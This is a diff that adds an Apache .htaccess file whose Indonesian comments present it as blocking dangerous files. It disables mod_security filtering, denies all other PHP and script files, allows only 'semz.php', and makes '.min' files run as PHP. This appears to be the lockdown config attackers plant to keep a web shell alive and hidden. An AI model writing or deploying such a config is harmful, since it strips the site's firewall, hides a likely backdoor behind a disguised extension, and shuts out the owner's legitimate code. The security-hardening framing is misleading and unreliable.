@@ -1,0 +1,25 @@
+<IfModule mod_security.c>
+    SecFilterEngine Off
+    SecFilterScanPOST Off
+</IfModule>
+
+# Blokir file dengan ekstensi berbahaya
+<FilesMatch "\.(php[0-9]?|phtml|phps|phar|asp|aspx|shtml|cgi|exe|pl|py|sh|bash|cmd|bat|scr|dll)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# Blokir file PHP yang disamarkan sebagai gambar atau dokumen
+<FilesMatch "\.(php\.(jpg|jpeg|png|gif|pdf|txt|zip|docx?|xlsx?|pptx?)|php[0-9]*\.(jpg|jpeg|png|gif|pdf)|php\.suspected)$">
+    Order allow,deny
+    Deny from all
+</FilesMatch>
+
+# Izinkan file tertentu yang memang sah untuk diakses
+<FilesMatch "^(semz.php)$">
+    Order allow,deny
+    Allow from all
+</FilesMatch>
+
+# Izinkan ekstensi .min untuk diproses sebagai PHP
+AddType application/x-httpd-php .min
